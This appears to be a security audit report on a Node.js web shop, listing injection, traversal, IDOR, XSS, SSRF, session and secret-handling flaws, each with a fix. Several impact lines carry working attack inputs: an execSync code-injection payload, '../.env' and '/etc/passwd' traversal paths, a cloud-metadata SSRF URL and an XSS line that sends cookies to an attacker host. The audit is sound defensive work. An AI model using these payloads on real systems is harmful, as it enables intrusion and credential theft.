title: Search term is interpolated into a predicate string that is compiled with new Function, giving arbitrary code execution
summary: The `q` query parameter is read straight off the URL and concatenated into the JavaScript expression string `where`, which is passed to `query()` in db.js. There it is spliced into a `new Function("row", ...)` body and compiled, so the attacker's text becomes executable server-side code rather than data.
impact: Unauthenticated arbitrary JavaScript execution inside the server process: `?q=") || process.mainModule.require('child_process').execSync('id') || ("` style payloads run shell commands, read the in-memory `users` array with its plaintext passwords, or exfiltrate the process environment. Full host compromise.
evidence: server.js:119 builds `row.name.toLowerCase().includes("${term.toLowerCase()}")` from user input, and db.js:33 compiles the caller's string with `new Function("row", `try { return (${where}); } ...`)`.
remediation: Delete the string-predicate interface. Have `query()` take a structured filter (e.g. `{ field, contains }`) and apply it with a normal JavaScript comparison, so no caller-supplied text is ever compiled.

title: GET /api/files joins a user-supplied name onto the data directory with no containment check, allowing arbitrary file read
summary: The `name` query parameter is passed directly to `path.join(PUBLIC_DIR, name)` and the result is read with `fs.readFileSync`. `path.join` resolves `..` segments, and an absolute `name` makes it discard `PUBLIC_DIR` entirely, so the resolved path can escape the intended directory.
impact: Any unauthenticated caller reads arbitrary files readable by the server user: `?name=../.env` returns the committed `SESSION_SECRET` and billing secret, `?name=../src/db.js` returns every account password, and `?name=/etc/passwd` leaves the project tree completely.
evidence: server.js:149-151 does `path.join(PUBLIC_DIR, name)` then `fs.readFileSync(target, "utf8")` with no `path.resolve` prefix check and no authentication gate on the route.
remediation: Resolve the candidate and reject anything outside the base: `const target = path.resolve(PUBLIC_DIR, name); if (!target.startsWith(PUBLIC_DIR + path.sep)) return 400;` — or better, serve only from a fixed allowlist of file names.

title: GET /api/admin/users returns every account record to any signed-in user, including plaintext passwords
summary: The administrative listing checks only that `currentUser(request)` returned something; it never inspects `user.role`. The whole `users` array from db.js is then serialized, and those objects carry the `password` field.
impact: A customer account such as alice logs in and reads the admin account's email and password verbatim, then authenticates as admin. Authentication for the entire application is bypassed by one authenticated GET, and every user's credentials are disclosed.
evidence: server.js:111 is `if (!user) return json(response, 401, ...)` with no role comparison, and line 112 returns the raw `users` array whose elements include `password` (db.js:6-8).
remediation: Add the role gate — `if (user.role !== "admin") return json(response, 403, { error: "forbidden" })` — and project the response to non-secret fields (`id`, `email`, `role`, `name`) instead of returning the record.

title: Session tokens are MD5 of the user id and the session-map size, so they are fully predictable
summary: On successful login the token is `md5("${user.id}:${sessions.size}")`. Both inputs are small integers with no secret and no randomness, so the token space is the cross product of a handful of user ids and a low session counter.
impact: An attacker enumerates `md5("3:0")`, `md5("3:1")`, … offline and sets the `session` cookie to a valid admin token without ever knowing a password. Because the counter only grows, guessing the admin's live session is a few hundred tries, and the same token is regenerated for a repeated (id, size) pair.
evidence: server.js:78 derives the token with `crypto.createHash("md5").update(`${user.id}:${sessions.size}`)`, and the comment above it acknowledges a low-entropy counter.
remediation: Use `crypto.randomBytes(32).toString("hex")` as the session identifier; nothing about the user should be derivable from it.

title: User passwords are stored and compared in plaintext
summary: The `users` records hold a `password` string in clear, and the login handler compares it with `candidate.password === body.password`. There is no hash, no salt, and no constant-time comparison anywhere in the credential path.
impact: Any read of the store — via the code injection at /api/products/search, the traversal at /api/files, or the unprotected admin listing — hands over directly reusable credentials for every account rather than hashes an attacker would have to crack. It also makes credential reuse against the users' other services immediate.
evidence: db.js:6-8 define `password: "alice-password-1"` etc., and server.js:75 matches on `candidate.password === body.password`.
remediation: Store `scrypt`/`argon2id` hashes and verify with the algorithm's own verify function (e.g. `crypto.timingSafeEqual` over derived keys); never keep the cleartext.

title: GET /api/orders/:id returns any order by id without checking that it belongs to the caller
summary: The handler authenticates, then looks the order up purely by the numeric id taken from the path: `orders.find((candidate) => candidate.id === id)`. The authenticated `user` is never compared against `order.userId`.
impact: A signed-in customer walks ids 101, 102, 103 and reads other customers' order totals, delivery addresses, and stored card fragments — including the admin's order. Ids are sequential (`200 + orders.length` at checkout), so full enumeration is trivial.
evidence: server.js:96 filters on `candidate.id === id` only, while the sibling listing at line 104 correctly filters `order.userId === user.id`.
remediation: Include the subject in the lookup predicate: `orders.find((c) => c.id === id && c.userId === user.id)`, and return 404 when it misses.

title: invoiceByReference has no user parameter, so GET /api/invoices/:reference serves any customer's invoice
summary: The route authenticates and then delegates to `invoiceByReference(reference)` with the reference from the URL path. That function matches on reference alone and accepts no owner argument, so no caller is able to scope it and this one does not try.
impact: Any signed-in customer requests `/api/invoices/inv-bob-01` or `/api/invoices/inv-root-01` and receives another account's invoice total, card fragment, and delivery address. References are guessable (`inv-<name>-01`), and the correctly scoped listing next door confirms the omission is unintended.
evidence: invoices.js:28 is `invoices.find((candidate) => candidate.reference === reference)` with no userId in scope, while `invoicesForUser` at line 33 does filter on `candidate.userId === userId`.
remediation: Change the signature to `invoiceByReference(reference, userId)` and match both fields, so the ownership predicate cannot be forgotten by a caller.

title: GET /search writes the q parameter into the HTML response unescaped, giving reflected XSS
summary: The `q` search parameter is read from the query string and interpolated into a template literal that is sent with `content-type: text/html`. No escaping or sanitization is applied on the way out, so markup in `q` is parsed as markup.
impact: A crafted link such as `/search?q=<script>fetch('//attacker/'+document.cookie)</script>` runs script in the victim's origin. Because the session cookie is set without `HttpOnly` (line 80), the payload reads it directly and hands the attacker the victim's session, including an admin's.
evidence:
server.js:128 returns `` `

Results for ${term}

...` `` via `html()`, which sets `content-type: text/html; charset=utf-8` at line 26.
remediation: HTML-escape the value before interpolation (replace `&<>"'` with entities) or return the term as JSON and render it client-side with `textContent`.

title: POST /api/import fetches an arbitrary caller-supplied URL and returns the response body
summary: `body.url` from the JSON request is passed to `fetch(target, { redirect: "follow" })` with no scheme check, no host allowlist, and no private-address filter. The status and first 2000 bytes of the response are returned to the caller.
impact: Any signed-in user makes the server issue requests it is trusted to make and reads the answers: cloud instance metadata (`http://169.254.169.254/...`) for credentials, internal-only hosts such as the configured `INTERNAL_WEBHOOK_URL`, and loopback admin ports. `redirect: "follow"` means an external allowlist check would still be bypassed by a redirect to an internal address.
evidence: server.js:137-142 takes `const target = body.url`, checks only that it is truthy, then fetches it and returns `{ fetched, status, body: text.slice(0, 2000) }`.
remediation: Validate against an allowlist of permitted origins after parsing with `new URL`, reject non-http(s) schemes and resolved private/link-local addresses, and set `redirect: "manual"` so redirect targets are re-validated.

title: POST /api/checkout trusts the client quantity, so a negative value produces a negative order total
summary: `quantity` is taken from the request body through a bare `Number(body.quantity ?? 1)` and multiplied by `product.price` with no lower bound, no integer check, and no NaN guard. The product is the stored total on the persisted order.
impact: `{"productId":1,"quantity":-100}` creates an order with a total of -420000, a credit on the account rather than a charge; a fractional or NaN quantity corrupts the ledger the same way. An attacker mints balance without paying.
evidence: server.js:166-168 computes `const total = product.price * quantity` from the unvalidated body value and pushes `{ ..., total }` onto `orders`.
remediation: Validate before use: require `Number.isInteger(quantity) && quantity >= 1 && quantity <= MAX_QUANTITY`, and reject with 400 otherwise.

title: A billing API secret is hard-coded in server.js and embedded in the BUILD_INFO object
summary: `BILLING_API_SECRET` is assigned a literal credential value in source rather than read from the environment, and line 17 copies it into `BUILD_INFO.secretKey`, a structure that is serialized to clients by the debug route. The same value is also committed in `.env`.
impact: Anyone with read access to the repository — or to the traversal/injection primitives above, or to `GET /debug/config` — obtains the billing credential. Rotating it requires a code change and redeploy, and every fork or clone retains it in git history.
evidence: server.js:16 declares the constant with an inline literal, and line 17 places it in `BUILD_INFO` as `secretKey`, which line 223 returns over HTTP.
remediation: Read it from `process.env.BILLING_API_SECRET`, fail startup if absent, keep it out of `BUILD_INFO`, and rotate the exposed value.

title: GET /debug/config is unauthenticated and returns the build secret and SESSION_SECRET
summary: The debug route has no authentication check and no environment guard. It serializes `BUILD_INFO`, which carries the hard-coded billing secret as `secretKey`, together with `process.env.SESSION_SECRET`.
impact: One anonymous GET yields the billing credential and the session signing secret, plus the Node version for exploit targeting. This is the cheapest path to the secrets that every other finding here has to work for.
evidence: server.js:222-224 matches `GET /debug/config` before any `currentUser` call and returns `{ build: BUILD_INFO, env: { PORT, SESSION_SECRET: process.env.SESSION_SECRET } }`.
remediation: Delete the route. If a build banner is genuinely needed, expose only the commit hash, behind an admin role check.

title: The session cookie is set without HttpOnly, Secure, or SameSite
summary: The `set-cookie` header is written as `session=${token}; Path=/` and nothing else. All three protective attributes are absent, and the token is additionally echoed in the JSON response body.
impact: `document.cookie` is readable by any injected script, which turns the reflected XSS at /search into full session theft; without `Secure` the token travels over plaintext HTTP; without `SameSite` it is attached to cross-site requests, enabling the CSRF below.
evidence: server.js:80 is `response.setHeader("set-cookie", `session=${token}; Path=/`)` with no attribute flags.
remediation: Set `session=<token>; Path=/; HttpOnly; Secure; SameSite=Lax` and stop returning the token in the response body.

title: State-changing POST routes have no CSRF defence and accept cross-site form submissions
summary: Authorization for the mutating routes rests entirely on the ambient `session` cookie. There is no CSRF token, no Origin or Referer check, and `readBody` parses the raw bytes as JSON regardless of `content-type`, so a simple cross-origin form post with `enctype=text/plain` reaches the handler.
impact: An attacker's page silently makes a logged-in victim place orders (`/api/checkout`), redeem promotions, or trigger server-side fetches (`/api/import`) as themselves. The missing `SameSite` attribute at line 80 removes the browser's fallback protection.
evidence: server.js:160-171 and 209-219 read `currentUser(request)` and act on the body with no token comparison, and `readBody` (line 48) ignores the request content-type entirely.
remediation: Require a per-session CSRF token on every non-GET route, or at minimum reject requests whose `Origin` header is not the application's own and enforce `content-type: application/json`.

title: POST /api/login has no rate limit or lockout on failed credential attempts
summary: The login handler compares the submitted email and password against the user array and returns 401 on mismatch. Nothing counts failures per account or per source address, and no delay or lockout is applied.
impact: An attacker sprays passwords at a known address as fast as the server responds. Combined with the enumeration oracle at /api/password-reset, which confirms which addresses exist, this makes credential guessing against the admin account practical and unobserved.
evidence: server.js:73-76 performs the credential match with no attempt counter, and the comment above the route states there is no rate limiting and no lockout.
remediation: Track failures keyed by account and client address, and apply exponential backoff plus a temporary lockout once a small threshold is passed.

title: POST /api/password-reset distinguishes unknown from known addresses, giving an account enumeration oracle
summary: The handler looks the submitted email up in `users`. A miss returns 404 with `no account with that address`; a hit returns 200 with `sent: true` and echoes the stored address. The response therefore reveals registration status for any address the caller supplies.
impact: An attacker submits an address list and learns which are registered, then focuses password spraying and phishing on confirmed accounts — the unlimited login route above makes that immediately useful. The echoed address also confirms the exact stored spelling.
evidence: server.js:203 returns a 404 with a distinguishing message while line 204 returns 200 with `hint: `a link was sent to ${account.email}``.
remediation: Return the identical 200 body and timing for every submitted address, and only send mail when the account exists.

title: POST /api/promotions/redeem never records redemption, so one code can be applied repeatedly to the same order
summary: `applyPromotion` computes a discounted total from the code and the current total but stores nothing about the redemption, and the handler assigns the result back with `order.total = outcome.total`. No per-order or per-user redemption ledger is consulted or written.
impact: The owner of an order posts the same code in a loop, each call taking a further 10% off the already-discounted total, driving the payable amount to zero. There is also no code expiry or per-user cap to stop it.
evidence: server.js:215-217 applies the outcome to `order.total` with no redemption check, and invoices.js:46-50 returns `{ applied, total }` without persisting anything.
remediation: Record `(orderId, code)` in a redemption set and reject with 409 if it is already present, in the same operation that mutates the total.

title: The top-level error handler returns the exception message and stack trace to the client
summary: The `catch` wrapping every route responds with `{ error: error.message, stack: error.stack }`. The stack is generated from server-side execution and contains absolute source paths, function names, and line numbers.
impact: An attacker triggers a crash on any route and maps the deployment: filesystem layout, module structure, and Node internals. That intelligence directly shortens the path to exploiting the traversal and injection sinks above.
evidence: server.js:229 is `return json(response, 500, { error: error.message, stack: error.stack })`.
remediation: Log the error server-side and return a generic `{ error: "internal error" }` with the 500.

title: GET /api/files returns the raw filesystem error message on failure, leaking absolute paths
summary: When `readFileSync` throws, the 404 response includes `detail: String(error.message)`, which for `ENOENT`/`EACCES` embeds the fully resolved absolute path the server attempted to open.
impact: The error text turns the endpoint into a filesystem probe: an attacker distinguishes existing from missing paths and learns the install root, which makes targeting the traversal on the same route precise instead of blind.
evidence: server.js:154 returns `{ error: "not found", detail: String(error.message) }` built from the caught `fs` error.
remediation: Drop the `detail` field and return only the generic 404, logging the underlying error server-side.

title: GET /api/products/search echoes the composed query predicate back to the caller
summary: The response body includes `where`, the internal predicate expression built from the user's search term. This exposes the server's query construction and reflects the attacker's own payload after transformation.
impact: It gives an attacker a feedback channel for developing the code-injection payload on the same route: each attempt shows exactly how the input was embedded and where the quoting boundary falls, converting blind probing into a guided exploit.
evidence: server.js:121 returns `json(response, 200, { where, rows })`, where `where` is the predicate string constructed at line 119.
remediation: Return only `rows`; never expose internal query representations in responses.

title: Sessions are stored with a createdAt that is never checked, and there is no logout route
summary: `sessions.set(token, { userId, createdAt: Date.now() })` records a timestamp, but `currentUser` only checks that the map has the token — it never compares `createdAt` against a lifetime. No route ever deletes an entry.
impact: A token stolen through the XSS, the plaintext cookie, or the predictable-token weakness stays valid for the entire process lifetime, and a user has no way to invalidate it. The map also grows without bound, one entry per login.
evidence: server.js:79 stores `createdAt` while `currentUser` at lines 43-45 does `sessions.get(session)` with no expiry comparison, and no `sessions.delete` appears anywhere.
remediation: Reject and delete sessions older than a fixed TTL inside `currentUser`, and add a logout route that deletes the entry.

title: .env with live secret values is committed to the repository
summary: `.env` is a tracked file (confirmed with `git ls-files`) and holds `SESSION_SECRET` and `BILLING_API_SECRET` values plus internal hostnames. Secrets in git are readable by everyone with repository access and persist in history after removal.
impact: Anyone who clones or forks the repository obtains the session signing secret and billing credential, and can forge or verify anything derived from them. Deleting the file later does not revoke them, since the values remain in every historical commit.
evidence: `git ls-files` lists `.env`, and the file assigns concrete values to `SESSION_SECRET` and `BILLING_API_SECRET` rather than placeholders.
remediation: Untrack the file (`git rm --cached .env`), add it to `.gitignore`, commit a placeholder `.env.example`, and rotate both secrets.

title: Declared dependencies lodash 4.17.11 and minimist 1.2.0 are pinned to versions with known prototype-pollution advisories
summary: `package.json` pins `lodash` at 4.17.11 and `minimist` at 1.2.0. Both are below their advisory fix lines — lodash prototype pollution in `defaultsDeep`/`zipObjectDeep` is fixed in 4.17.12/4.17.19, and minimist's argument-parsing prototype pollution is fixed in 1.2.3/1.2.6.
impact: Nothing in `src/` imports either package today, so there is no live exploit path; the risk is that the first future `import` of them inherits a known-vulnerable version, and any audit gate on this manifest fails. Exact pins also mean no patch arrives automatically.
evidence: package.json:11-12 pin the two exact versions, and a search of `src/` for `lodash|minimist` returns no matches, so they are declared but unused.
remediation: Remove both dependencies since nothing imports them; if they are needed later, add them at `^4.17.21` and `^1.2.8`.
